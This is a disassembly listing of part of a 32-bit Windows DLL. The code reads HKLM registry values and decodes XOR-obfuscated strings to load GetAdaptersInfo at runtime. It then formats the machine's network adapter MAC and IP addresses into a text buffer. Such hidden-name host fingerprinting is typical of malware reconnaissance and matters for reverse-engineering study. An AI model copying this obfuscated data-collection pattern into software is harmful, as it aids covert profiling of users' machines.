10005ef0:	89 85 fc fd ff ff    	mov    %eax,-0x204(%ebp)
10005ef6:	8d 85 58 fd ff ff    	lea    -0x2a8(%ebp),%eax
10005efc:	50                   	push   %eax
10005efd:	e8 ec 16 00 00       	call   0x100075ee
10005f02:	8d 85 58 fd ff ff    	lea    -0x2a8(%ebp),%eax
10005f08:	89 85 00 fe ff ff    	mov    %eax,-0x200(%ebp)
10005f0e:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
10005f14:	50                   	push   %eax
10005f15:	e8 d4 16 00 00       	call   0x100075ee
10005f1a:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
10005f20:	89 85 48 fd ff ff    	mov    %eax,-0x2b8(%ebp)
10005f26:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
10005f2c:	50                   	push   %eax
10005f2d:	e8 bc 16 00 00       	call   0x100075ee
10005f32:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
10005f38:	89 85 4c fd ff ff    	mov    %eax,-0x2b4(%ebp)
10005f3e:	8d 45 dc             	lea    -0x24(%ebp),%eax
10005f41:	50                   	push   %eax
10005f42:	e8 a7 16 00 00       	call   0x100075ee
10005f47:	83 c4 34             	add    $0x34,%esp
10005f4a:	8d 45 dc             	lea    -0x24(%ebp),%eax
10005f4d:	89 85 50 fd ff ff    	mov    %eax,-0x2b0(%ebp)
10005f53:	c7 85 f4 fb ff ff 04 	movl   $0x104,-0x40c(%ebp)
10005f5a:	01 00 00 
10005f5d:	89 9d 00 fd ff ff    	mov    %ebx,-0x300(%ebp)
10005f63:	8b 7d 08             	mov    0x8(%ebp),%edi
10005f66:	8b 35 cc e1 00 10    	mov    0x1000e1cc,%esi
10005f6c:	8b 85 00 fd ff ff    	mov    -0x300(%ebp),%eax
10005f72:	83 f8 0a             	cmp    $0xa,%eax
10005f75:	0f 8d 31 01 00 00    	jge    0x100060ac
10005f7b:	8d 8d 44 fd ff ff    	lea    -0x2bc(%ebp),%ecx
10005f81:	51                   	push   %ecx
10005f82:	68 19 00 02 00       	push   $0x20019
10005f87:	53                   	push   %ebx
10005f88:	ff b4 85 dc fd ff ff 	push   -0x224(%ebp,%eax,4)
10005f8f:	68 02 00 00 80       	push   $0x80000002
10005f94:	ff 15 3c e0 00 10    	call   *0x1000e03c
10005f9a:	85 c0                	test   %eax,%eax
10005f9c:	0f 85 ff 00 00 00    	jne    0x100060a1
10005fa2:	57                   	push   %edi
10005fa3:	e8 b8 73 00 00       	call   0x1000d360
10005fa8:	59                   	pop    %ecx
10005fa9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10005fac:	2b c8                	sub    %eax,%ecx
10005fae:	51                   	push   %ecx
10005faf:	ff b5 00 fd ff ff    	push   -0x300(%ebp)
10005fb5:	e8 c7 0c 00 00       	call   0x10006c81
10005fba:	59                   	pop    %ecx
10005fbb:	50                   	push   %eax
10005fbc:	57                   	push   %edi
10005fbd:	ff d6                	call   *%esi
10005fbf:	57                   	push   %edi
10005fc0:	e8 9b 73 00 00       	call   0x1000d360
10005fc5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10005fc8:	2b c8                	sub    %eax,%ecx
10005fca:	51                   	push   %ecx
10005fcb:	68 38 01 01 10       	push   $0x10010138
10005fd0:	57                   	push   %edi
10005fd1:	ff d6                	call   *%esi
10005fd3:	83 c4 1c             	add    $0x1c,%esp
10005fd6:	89 9d f0 fb ff ff    	mov    %ebx,-0x410(%ebp)
10005fdc:	8b 85 f0 fb ff ff    	mov    -0x410(%ebp),%eax
10005fe2:	83 f8 03             	cmp    $0x3,%eax
10005fe5:	0f 8d 9f 00 00 00    	jge    0x1000608a
10005feb:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
10005ff1:	51                   	push   %ecx
10005ff2:	68 19 00 02 00       	push   $0x20019
10005ff7:	53                   	push   %ebx
10005ff8:	ff b4 85 48 fd ff ff 	push   -0x2b8(%ebp,%eax,4)
10005fff:	ff b5 44 fd ff ff    	push   -0x2bc(%ebp)
10006005:	ff 15 3c e0 00 10    	call   *0x1000e03c
1000600b:	85 c0                	test   %eax,%eax
1000600d:	75 59                	jne    0x10006068
1000600f:	68 05 01 00 00       	push   $0x105
10006014:	53                   	push   %ebx
10006015:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
1000601b:	50                   	push   %eax
1000601c:	e8 f5 72 00 00       	call   0x1000d316
10006021:	83 c4 0c             	add    $0xc,%esp
10006024:	c7 85 f4 fb ff ff 04 	movl   $0x104,-0x40c(%ebp)
1000602b:	01 00 00 
1000602e:	8d 85 f4 fb ff ff    	lea    -0x40c(%ebp),%eax
10006034:	50                   	push   %eax
10006035:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
1000603b:	50                   	push   %eax
1000603c:	53                   	push   %ebx
1000603d:	53                   	push   %ebx
1000603e:	53                   	push   %ebx
1000603f:	ff b5 0c ff ff ff    	push   -0xf4(%ebp)
10006045:	ff 15 40 e0 00 10    	call   *0x1000e040
1000604b:	85 c0                	test   %eax,%eax
1000604d:	75 19                	jne    0x10006068
1000604f:	57                   	push   %edi
10006050:	e8 0b 73 00 00       	call   0x1000d360
10006055:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10006058:	2b c8                	sub    %eax,%ecx
1000605a:	51                   	push   %ecx
1000605b:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
10006061:	50                   	push   %eax
10006062:	57                   	push   %edi
10006063:	ff d6                	call   *%esi
10006065:	83 c4 10             	add    $0x10,%esp
10006068:	57                   	push   %edi
10006069:	e8 f2 72 00 00       	call   0x1000d360
1000606e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10006071:	2b c8                	sub    %eax,%ecx
10006073:	51                   	push   %ecx
10006074:	68 38 01 01 10       	push   $0x10010138
10006079:	57                   	push   %edi
1000607a:	ff d6                	call   *%esi
1000607c:	83 c4 10             	add    $0x10,%esp
1000607f:	ff 85 f0 fb ff ff    	incl   -0x410(%ebp)
10006085:	e9 52 ff ff ff       	jmp    0x10005fdc
1000608a:	57                   	push   %edi
1000608b:	e8 d0 72 00 00       	call   0x1000d360
10006090:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10006093:	2b c8                	sub    %eax,%ecx
10006095:	51                   	push   %ecx
10006096:	68 34 01 01 10       	push   $0x10010134
1000609b:	57                   	push   %edi
1000609c:	ff d6                	call   *%esi
1000609e:	83 c4 10             	add    $0x10,%esp
100060a1:	ff 85 00 fd ff ff    	incl   -0x300(%ebp)
100060a7:	e9 c0 fe ff ff       	jmp    0x10005f6c
100060ac:	57                   	push   %edi
100060ad:	e8 ae 72 00 00       	call   0x1000d360
100060b2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100060b5:	2b c8                	sub    %eax,%ecx
100060b7:	51                   	push   %ecx
100060b8:	68 30 01 01 10       	push   $0x10010130
100060bd:	57                   	push   %edi
100060be:	ff d6                	call   *%esi
100060c0:	83 c4 10             	add    $0x10,%esp
100060c3:	eb 0b                	jmp    0x100060d0
100060c5:	6a 01                	push   $0x1
100060c7:	58                   	pop    %eax
100060c8:	c3                   	ret
100060c9:	8b 65 e8             	mov    -0x18(%ebp),%esp
100060cc:	83 65 98 00          	andl   $0x0,-0x68(%ebp)
100060d0:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100060d4:	8b 45 98             	mov    -0x68(%ebp),%eax
100060d7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100060da:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100060e1:	5f                   	pop    %edi
100060e2:	5e                   	pop    %esi
100060e3:	5b                   	pop    %ebx
100060e4:	c9                   	leave
100060e5:	c3                   	ret
100060e6:	55                   	push   %ebp
100060e7:	8b ec                	mov    %esp,%ebp
100060e9:	6a ff                	push   $0xffffffff
100060eb:	68 88 e3 00 10       	push   $0x1000e388
100060f0:	68 00 c6 00 10       	push   $0x1000c600
100060f5:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100060fb:	50                   	push   %eax
100060fc:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10006103:	81 ec 84 00 00 00    	sub    $0x84,%esp
10006109:	53                   	push   %ebx
1000610a:	56                   	push   %esi
1000610b:	57                   	push   %edi
1000610c:	89 65 e8             	mov    %esp,-0x18(%ebp)
1000610f:	33 db                	xor    %ebx,%ebx
10006111:	89 5d d0             	mov    %ebx,-0x30(%ebp)
10006114:	89 5d c4             	mov    %ebx,-0x3c(%ebp)
10006117:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
1000611a:	6a 01                	push   $0x1
1000611c:	58                   	pop    %eax
1000611d:	89 45 9c             	mov    %eax,-0x64(%ebp)
10006120:	c6 45 d8 16          	movb   $0x16,-0x28(%ebp)
10006124:	c6 45 d9 0f          	movb   $0xf,-0x27(%ebp)
10006128:	c6 45 da 17          	movb   $0x17,-0x26(%ebp)
1000612c:	c6 45 db 13          	movb   $0x13,-0x25(%ebp)
10006130:	c6 45 dc 0f          	movb   $0xf,-0x24(%ebp)
10006134:	c6 45 dd 1e          	movb   $0x1e,-0x23(%ebp)
10006138:	c6 45 de 0f          	movb   $0xf,-0x22(%ebp)
1000613c:	c6 45 df 16          	movb   $0x16,-0x21(%ebp)
10006140:	c6 45 e0 51          	movb   $0x51,-0x20(%ebp)
10006144:	c6 45 e1 1b          	movb   $0x1b,-0x1f(%ebp)
10006148:	c6 45 e2 13          	movb   $0x13,-0x1e(%ebp)
1000614c:	c6 45 e3 13          	movb   $0x13,-0x1d(%ebp)
10006150:	20 5d e4             	and    %bl,-0x1c(%ebp)
10006153:	c6 45 88 38          	movb   $0x38,-0x78(%ebp)
10006157:	c6 45 89 1a          	movb   $0x1a,-0x77(%ebp)
1000615b:	c6 45 8a 0b          	movb   $0xb,-0x76(%ebp)
1000615f:	c6 45 8b 3e          	movb   $0x3e,-0x75(%ebp)
10006163:	c6 45 8c 1b          	movb   $0x1b,-0x74(%ebp)
10006167:	c6 45 8d 1e          	movb   $0x1e,-0x73(%ebp)
1000616b:	c6 45 8e 0f          	movb   $0xf,-0x72(%ebp)
1000616f:	c6 45 8f 0b          	movb   $0xb,-0x71(%ebp)
10006173:	c6 45 90 1a          	movb   $0x1a,-0x70(%ebp)
10006177:	c6 45 91 0d          	movb   $0xd,-0x6f(%ebp)
1000617b:	c6 45 92 0c          	movb   $0xc,-0x6e(%ebp)
1000617f:	c6 45 93 36          	movb   $0x36,-0x6d(%ebp)
10006183:	c6 45 94 11          	movb   $0x11,-0x6c(%ebp)
10006187:	c6 45 95 19          	movb   $0x19,-0x6b(%ebp)
1000618b:	c6 45 96 10          	movb   $0x10,-0x6a(%ebp)
1000618f:	20 5d 97             	and    %bl,-0x69(%ebp)
10006192:	c6 45 a0 5a          	movb   $0x5a,-0x60(%ebp)
10006196:	c6 45 a1 4f          	movb   $0x4f,-0x5f(%ebp)
1000619a:	c6 45 a2 4d          	movb   $0x4d,-0x5e(%ebp)
1000619e:	c6 45 a3 07          	movb   $0x7,-0x5d(%ebp)
100061a2:	c6 45 a4 5a          	movb   $0x5a,-0x5c(%ebp)
100061a6:	c6 45 a5 4f          	movb   $0x4f,-0x5b(%ebp)
100061aa:	c6 45 a6 4d          	movb   $0x4d,-0x5a(%ebp)
100061ae:	c6 45 a7 07          	movb   $0x7,-0x59(%ebp)
100061b2:	c6 45 a8 5a          	movb   $0x5a,-0x58(%ebp)
100061b6:	c6 45 a9 4f          	movb   $0x4f,-0x57(%ebp)
100061ba:	c6 45 aa 4d          	movb   $0x4d,-0x56(%ebp)
100061be:	c6 45 ab 07          	movb   $0x7,-0x55(%ebp)
100061c2:	c6 45 ac 5a          	movb   $0x5a,-0x54(%ebp)
100061c6:	c6 45 ad 4f          	movb   $0x4f,-0x53(%ebp)
100061ca:	c6 45 ae 4d          	movb   $0x4d,-0x52(%ebp)
100061ce:	c6 45 af 07          	movb   $0x7,-0x51(%ebp)
100061d2:	c6 45 b0 5a          	movb   $0x5a,-0x50(%ebp)
100061d6:	c6 45 b1 4f          	movb   $0x4f,-0x4f(%ebp)
100061da:	c6 45 b2 4d          	movb   $0x4d,-0x4e(%ebp)
100061de:	c6 45 b3 07          	movb   $0x7,-0x4d(%ebp)
100061e2:	c6 45 b4 5a          	movb   $0x5a,-0x4c(%ebp)
100061e6:	c6 45 b5 4f          	movb   $0x4f,-0x4b(%ebp)
100061ea:	c6 45 b6 4d          	movb   $0x4d,-0x4a(%ebp)
100061ee:	c6 45 b7 07          	movb   $0x7,-0x49(%ebp)
100061f2:	c6 45 b8 5a          	movb   $0x5a,-0x48(%ebp)
100061f6:	c6 45 b9 4f          	movb   $0x4f,-0x47(%ebp)
100061fa:	c6 45 ba 4d          	movb   $0x4d,-0x46(%ebp)
100061fe:	c6 45 bb 07          	movb   $0x7,-0x45(%ebp)
10006202:	c6 45 bc 5a          	movb   $0x5a,-0x44(%ebp)
10006206:	c6 45 bd 4f          	movb   $0x4f,-0x43(%ebp)
1000620a:	c6 45 be 4d          	movb   $0x4d,-0x42(%ebp)
1000620e:	c6 45 bf 07          	movb   $0x7,-0x41(%ebp)
10006212:	20 5d c0             	and    %bl,-0x40(%ebp)
10006215:	c6 45 c8 5a          	movb   $0x5a,-0x38(%ebp)
10006219:	c6 45 c9 4f          	movb   $0x4f,-0x37(%ebp)
1000621d:	c6 45 ca 47          	movb   $0x47,-0x36(%ebp)
10006221:	c6 45 cb 07          	movb   $0x7,-0x35(%ebp)
10006225:	c6 45 cc 45          	movb   $0x45,-0x34(%ebp)
10006229:	c6 45 cd 45          	movb   $0x45,-0x33(%ebp)
1000622d:	20 5d ce             	and    %bl,-0x32(%ebp)
10006230:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10006233:	89 45 fc             	mov    %eax,-0x4(%ebp)
10006236:	8d 45 d8             	lea    -0x28(%ebp),%eax
10006239:	50                   	push   %eax
1000623a:	e8 af 13 00 00       	call   0x100075ee
1000623f:	8d 45 88             	lea    -0x78(%ebp),%eax
10006242:	50                   	push   %eax
10006243:	e8 a6 13 00 00       	call   0x100075ee
10006248:	8d 45 a0             	lea    -0x60(%ebp),%eax
1000624b:	50                   	push   %eax
1000624c:	e8 9d 13 00 00       	call   0x100075ee
10006251:	8d 45 c8             	lea    -0x38(%ebp),%eax
10006254:	50                   	push   %eax
10006255:	e8 94 13 00 00       	call   0x100075ee
1000625a:	83 c4 10             	add    $0x10,%esp
1000625d:	39 5d 08             	cmp    %ebx,0x8(%ebp)
10006260:	0f 84 8c 02 00 00    	je     0x100064f2
10006266:	8d 45 d8             	lea    -0x28(%ebp),%eax
10006269:	50                   	push   %eax
1000626a:	ff 15 14 e1 00 10    	call   *0x1000e114
10006270:	89 45 c4             	mov    %eax,-0x3c(%ebp)
10006273:	3b c3                	cmp    %ebx,%eax
10006275:	0f 84 77 02 00 00    	je     0x100064f2
1000627b:	8d 4d 88             	lea    -0x78(%ebp),%ecx
1000627e:	51                   	push   %ecx
1000627f:	50                   	push   %eax
10006280:	ff 15 1c e1 00 10    	call   *0x1000e11c
10006286:	8b f8                	mov    %eax,%edi
10006288:	89 7d 80             	mov    %edi,-0x80(%ebp)
1000628b:	3b fb                	cmp    %ebx,%edi
1000628d:	0f 84 5f 02 00 00    	je     0x100064f2
10006293:	8d 45 84             	lea    -0x7c(%ebp),%eax
10006296:	50                   	push   %eax
10006297:	53                   	push   %ebx
10006298:	ff d7                	call   *%edi
1000629a:	89 45 98             	mov    %eax,-0x68(%ebp)
1000629d:	83 f8 6f             	cmp    $0x6f,%eax
100062a0:	0f 85 48 02 00 00    	jne    0x100064ee
100062a6:	ff 75 84             	push   -0x7c(%ebp)
100062a9:	ff 15 c0 e1 00 10    	call   *0x1000e1c0
100062af:	59                   	pop    %ecx
100062b0:	8b f0                	mov    %eax,%esi
100062b2:	89 75 d4             	mov    %esi,-0x2c(%ebp)
100062b5:	3b f3                	cmp    %ebx,%esi
100062b7:	0f 84 35 02 00 00    	je     0x100064f2
100062bd:	89 75 d0             	mov    %esi,-0x30(%ebp)
100062c0:	8d 45 84             	lea    -0x7c(%ebp),%eax
100062c3:	50                   	push   %eax
100062c4:	56                   	push   %esi
100062c5:	ff d7                	call   *%edi
100062c7:	89 45 98             	mov    %eax,-0x68(%ebp)
100062ca:	3b c3                	cmp    %ebx,%eax
100062cc:	0f 85 20 02 00 00    	jne    0x100064f2
100062d2:	89 9d 7c ff ff ff    	mov    %ebx,-0x84(%ebp)
100062d8:	8b 3d a8 e0 00 10    	mov    0x1000e0a8,%edi
100062de:	3b f3                	cmp    %ebx,%esi
100062e0:	8b 5d 0c             	mov    0xc(%ebp),%ebx
100062e3:	0f 84 e5 01 00 00    	je     0x100064ce
100062e9:	39 9d 7c ff ff ff    	cmp    %ebx,-0x84(%ebp)
100062ef:	0f 87 d9 01 00 00    	ja     0x100064ce
100062f5:	ff 75 08             	push   0x8(%ebp)
100062f8:	ff d7                	call   *%edi
100062fa:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
10006300:	8b 8e 90 01 00 00    	mov    0x190(%esi),%ecx
10006306:	89 8d 70 ff ff ff    	mov    %ecx,-0x90(%ebp)
1000630c:	51                   	push   %ecx
1000630d:	8d 4d c8             	lea    -0x38(%ebp),%ecx
10006310:	51                   	push   %ecx
10006311:	8b cb                	mov    %ebx,%ecx
10006313:	2b c8                	sub    %eax,%ecx
10006315:	51                   	push   %ecx
10006316:	8b 4d 08             	mov    0x8(%ebp),%ecx
10006319:	03 c1                	add    %ecx,%eax
1000631b:	50                   	push   %eax
1000631c:	ff 15 d4 e1 00 10    	call   *0x1000e1d4
10006322:	8b 45 08             	mov    0x8(%ebp),%eax
10006325:	03 d8                	add    %eax,%ebx
10006327:	80 23 00             	andb   $0x0,(%ebx)
1000632a:	50                   	push   %eax
1000632b:	e8 30 70 00 00       	call   0x1000d360
10006330:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
10006336:	0f b6 8e 9b 01 00 00 	movzbl 0x19b(%esi),%ecx
1000633d:	51                   	push   %ecx
1000633e:	0f b6 8e 9a 01 00 00 	movzbl 0x19a(%esi),%ecx
10006345:	51                   	push   %ecx
10006346:	0f b6 8e 99 01 00 00 	movzbl 0x199(%esi),%ecx
1000634d:	51                   	push   %ecx
1000634e:	0f b6 8e 98 01 00 00 	movzbl 0x198(%esi),%ecx
10006355:	51                   	push   %ecx
10006356:	0f b6 8e 97 01 00 00 	movzbl 0x197(%esi),%ecx
1000635d:	51                   	push   %ecx
1000635e:	0f b6 8e 96 01 00 00 	movzbl 0x196(%esi),%ecx
10006365:	51                   	push   %ecx
10006366:	0f b6 8e 95 01 00 00 	movzbl 0x195(%esi),%ecx
1000636d:	51                   	push   %ecx
1000636e:	0f b6 8e 94 01 00 00 	movzbl 0x194(%esi),%ecx
10006375:	51                   	push   %ecx
10006376:	8d 4d a0             	lea    -0x60(%ebp),%ecx
10006379:	51                   	push   %ecx
1000637a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000637d:	2b c8                	sub    %eax,%ecx
1000637f:	51                   	push   %ecx
10006380:	8b 4d 08             	mov    0x8(%ebp),%ecx
10006383:	03 c1                	add    %ecx,%eax
10006385:	50                   	push   %eax
10006386:	ff 15 d4 e1 00 10    	call   *0x1000e1d4
1000638c:	83 c4 40             	add    $0x40,%esp
1000638f:	80 23 00             	andb   $0x0,(%ebx)
10006392:	ff 75 08             	push   0x8(%ebp)
10006395:	ff d7                	call   *%edi
10006397:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
1000639d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100063a0:	2b c8                	sub    %eax,%ecx
100063a2:	51                   	push   %ecx
100063a3:	68 38 01 01 10       	push   $0x10010138
100063a8:	ff 75 08             	push   0x8(%ebp)
100063ab:	ff 15 cc e1 00 10    	call   *0x1000e1cc
100063b1:	83 c4 0c             	add    $0xc,%esp
100063b4:	80 23 00             	andb   $0x0,(%ebx)
100063b7:	ff 75 08             	push   0x8(%ebp)
100063ba:	ff d7                	call   *%edi
100063bc:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
100063c2:	83 a5 74 ff ff ff 00 	andl   $0x0,-0x8c(%ebp)
100063c9:	8d 86 ac 01 00 00    	lea    0x1ac(%esi),%eax
100063cf:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
100063d5:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
100063db:	85 c0                	test   %eax,%eax
100063dd:	0f 84 91 00 00 00    	je     0x10006474
100063e3:	83 c0 04             	add    $0x4,%eax
100063e6:	50                   	push   %eax
100063e7:	ff d7                	call   *%edi
100063e9:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
100063ef:	8b 8d 7c ff ff ff    	mov    -0x84(%ebp),%ecx
100063f5:	03 c1                	add    %ecx,%eax
100063f7:	3b 45 0c             	cmp    0xc(%ebp),%eax
100063fa:	77 78                	ja     0x10006474
100063fc:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
10006402:	83 c0 04             	add    $0x4,%eax
10006405:	50                   	push   %eax
10006406:	68 40 01 01 10       	push   $0x10010140
1000640b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000640e:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
10006414:	2b c8                	sub    %eax,%ecx
10006416:	51                   	push   %ecx
10006417:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000641a:	03 c1                	add    %ecx,%eax
1000641c:	50                   	push   %eax
1000641d:	ff 15 d4 e1 00 10    	call   *0x1000e1d4
10006423:	83 c4 10             	add    $0x10,%esp
10006426:	80 23 00             	andb   $0x0,(%ebx)
10006429:	ff 75 08             	push   0x8(%ebp)
1000642c:	ff d7                	call   *%edi
1000642e:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
10006434:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
1000643a:	8b 00                	mov    (%eax),%eax
1000643c:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
10006442:	85 c0                	test   %eax,%eax
10006444:	74 8f                	je     0x100063d5
10006446:	8b 45 0c             	mov    0xc(%ebp),%eax
10006449:	2b 85 7c ff ff ff    	sub    -0x84(%ebp),%eax
1000644f:	50                   	push   %eax
10006450:	68 3c 01 01 10       	push   $0x1001013c
10006455:	ff 75 08             	push   0x8(%ebp)
10006458:	ff 15 cc e1 00 10    	call   *0x1000e1cc
1000645e:	83 c4 0c             	add    $0xc,%esp
10006461:	80 23 00             	andb   $0x0,(%ebx)
10006464:	ff 75 08             	push   0x8(%ebp)
10006467:	ff d7                	call   *%edi
10006469:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
1000646f:	e9 61 ff ff ff       	jmp    0x100063d5
10006474:	8b 45 0c             	mov    0xc(%ebp),%eax
10006477:	2b 85 7c ff ff ff    	sub    -0x84(%ebp),%eax
1000647d:	50                   	push   %eax
1000647e:	68 3c 01 01 10       	push   $0x1001013c
10006483:	ff 75 08             	push   0x8(%ebp)
10006486:	ff 15 cc e1 00 10    	call   *0x1000e1cc
1000648c:	83 c4 0c             	add    $0xc,%esp
1000648f:	80 23 00             	andb   $0x0,(%ebx)
10006492:	ff 75 08             	push   0x8(%ebp)
10006495:	ff d7                	call   *%edi
10006497:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
1000649d:	8b 36                	mov    (%esi),%esi
1000649f:	89 75 d4             	mov    %esi,-0x2c(%ebp)
100064a2:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100064a5:	2b c8                	sub    %eax,%ecx
100064a7:	51                   	push   %ecx
100064a8:	68 38 01 01 10       	push   $0x10010138
100064ad:	ff 75 08             	push   0x8(%ebp)
100064b0:	ff 15 cc e1 00 10    	call   *0x1000e1cc
100064b6:	83 c4 0c             	add    $0xc,%esp
100064b9:	80 23 00             	andb   $0x0,(%ebx)
100064bc:	ff 75 08             	push   0x8(%ebp)
100064bf:	ff d7                	call   *%edi
100064c1:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
100064c7:	33 db                	xor    %ebx,%ebx
100064c9:	e9 10 fe ff ff       	jmp    0x100062de
100064ce:	ff 75 08             	push   0x8(%ebp)
100064d1:	e8 8a 6e 00 00       	call   0x1000d360
100064d6:	2b d8                	sub    %eax,%ebx
100064d8:	53                   	push   %ebx
100064d9:	68 30 01 01 10       	push   $0x10010130
100064de:	ff 75 08             	push   0x8(%ebp)
100064e1:	ff 15 cc e1 00 10    	call   *0x1000e1cc
100064e7:	83 c4 10             	add    $0x10,%esp
100064ea:	33 db                	xor    %ebx,%ebx
100064ec:	eb 07                	jmp    0x100064f5
100064ee:	3b c3                	cmp    %ebx,%eax
100064f0:	74 03                	je     0x100064f5
100064f2:	89 5d 9c             	mov    %ebx,-0x64(%ebp)
100064f5:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100064f8:	e8 04 00 00 00       	call   0x10006501
100064fd:	eb 3c                	jmp    0x1000653b
100064ff:	33 db                	xor    %ebx,%ebx
10006501:	e8 be 6f 00 00       	call   0x1000d4c4
10006506:	85 c0                	test   %eax,%eax
10006508:	74 03                	je     0x1000650d
1000650a:	89 5d 9c             	mov    %ebx,-0x64(%ebp)
1000650d:	39 5d c4             	cmp    %ebx,-0x3c(%ebp)
10006510:	74 09                	je     0x1000651b
10006512:	ff 75 c4             	push   -0x3c(%ebp)
10006515:	ff 15 98 e0 00 10    	call   *0x1000e098
1000651b:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
1000651e:	74 0d                	je     0x1000652d
10006520:	ff 75 d0             	push   -0x30(%ebp)
10006523:	ff 15 c8 e1 00 10    	call   *0x1000e1c8
10006529:	59                   	pop    %ecx
1000652a:	89 5d d0             	mov    %ebx,-0x30(%ebp)
1000652d:	c3                   	ret
1000652e:	eb 0b                	jmp    0x1000653b
10006530:	6a 01                	push   $0x1
10006532:	58                   	pop    %eax
10006533:	c3                   	ret
10006534:	8b 65 e8             	mov    -0x18(%ebp),%esp
10006537:	83 65 9c 00          	andl   $0x0,-0x64(%ebp)
1000653b:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
1000653f:	8b 45 9c             	mov    -0x64(%ebp),%eax
10006542:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10006545:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000654c:	5f                   	pop    %edi
1000654d:	5e                   	pop    %esi
1000654e:	5b                   	pop    %ebx
1000654f:	c9                   	leave
10006550:	c3                   	ret
10006551:	55                   	push   %ebp
10006552:	8b ec                	mov    %esp,%ebp
10006554:	6a ff                	push   $0xffffffff
10006556:	68 a0 e3 00 10       	push   $0x1000e3a0
1000655b:	68 00 c6 00 10       	push   $0x1000c600
10006560:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10006566:	50                   	push   %eax
10006567:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
1000656e:	83 ec 18             	sub    $0x18,%esp
10006571:	53                   	push   %ebx
10006572:	56                   	push   %esi
10006573:	57                   	push   %edi
10006574:	89 65 e8             	mov    %esp,-0x18(%ebp)
10006577:	33 f6                	xor    %esi,%esi
10006579:	39 75 08             	cmp    %esi,0x8(%ebp)
1000657c:	75 04                	jne    0x10006582
1000657e:	32 c0                	xor    %al,%al
10006580:	eb 56                	jmp    0x100065d8
10006582:	89 75 fc             	mov    %esi,-0x4(%ebp)
10006585:	89 75 dc             	mov    %esi,-0x24(%ebp)
10006588:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000658b:	50                   	push   %eax
1000658c:	e8 e7 0f 00 00       	call   0x10007578
10006591:	59                   	pop    %ecx
10006592:	48                   	dec    %eax
10006593:	48                   	dec    %eax
10006594:	f7 d8                	neg    %eax
10006596:	1b c0                	sbb    %eax,%eax
10006598:	40                   	inc    %eax
10006599:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000659c:	74 0b                	je     0x100065a9
1000659e:	83 7d dc 04          	cmpl   $0x4,-0x24(%ebp)
100065a2:	77 05                	ja     0x100065a9
100065a4:	6a 01                	push   $0x1
100065a6:	58                   	pop    %eax
100065a7:	eb 02                	jmp    0x100065ab
100065a9:	33 c0                	xor    %eax,%eax
100065ab:	89 45 d8             	mov    %eax,-0x28(%ebp)
100065ae:	83 f8 01             	cmp    $0x1,%eax
100065b1:	ff 75 08             	push   0x8(%ebp)
100065b4:	75 07                	jne    0x100065bd
100065b6:	e8 f2 02 00 00       	call   0x100068ad
100065bb:	eb 05                	jmp    0x100065c2
100065bd:	e8 25 00 00 00       	call   0x100065e7
100065c2:	59                   	pop    %ecx
100065c3:	0f b6 c0             	movzbl %al,%eax
100065c6:	89 45 e4             	mov    %eax,-0x1c(%ebp)
100065c9:	eb 07                	jmp    0x100065d2
100065cb:	6a 01                	push   $0x1
100065cd:	58                   	pop    %eax
100065ce:	c3                   	ret
100065cf:	8b 65 e8             	mov    -0x18(%ebp),%esp
100065d2:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
100065d6:	b0 01                	mov    $0x1,%al
100065d8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
100065db:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100065e2:	5f                   	pop    %edi
100065e3:	5e                   	pop    %esi
100065e4:	5b                   	pop    %ebx
100065e5:	c9                   	leave
100065e6:	c3                   	ret
100065e7:	55                   	push   %ebp
100065e8:	8b ec                	mov    %esp,%ebp
100065ea:	6a ff                	push   $0xffffffff
100065ec:	68 b0 e3 00 10       	push   $0x1000e3b0
100065f1:	68 00 c6 00 10       	push   $0x1000c600
